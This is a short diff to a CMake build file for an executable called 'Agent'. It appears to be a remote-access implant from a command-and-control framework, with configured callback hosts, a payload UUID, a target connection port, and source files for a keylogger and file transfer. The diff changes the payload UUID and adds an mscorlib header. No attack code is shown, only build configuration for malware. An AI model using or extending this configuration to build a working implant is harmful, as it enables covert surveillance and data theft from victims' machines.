@@ -19,7 +19,7 @@ string(REPLACE ";" "\", L\"" HOSTS_INITIALIZER \"${INPUT_HOSTS}\")
 set(WIDE_HOSTS_LIST "L${HOSTS_INITIALIZER}")
 
 # Payload UUID Configuration
-set(INPUT_PAYLOAD_UUID "3de5beb2-3e4c-4864-804e-15f8157cb456" CACHE STRING "The payload unique identifier")
+set(INPUT_PAYLOAD_UUID "e8ebbf8c-dbfb-41ab-8699-9ac18afded4a" CACHE STRING "The payload unique identifier")
 
 # Port Configuration
 set(PORT 5069 CACHE STRING "The primary target connection port")
@@ -50,6 +50,7 @@ add_executable (
   "include/Keylogger.h"
   "src/FileTransfer.cpp"
   "include/FileTransfer.h"
+  "include/mscorlib.h"
 )
 
 target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
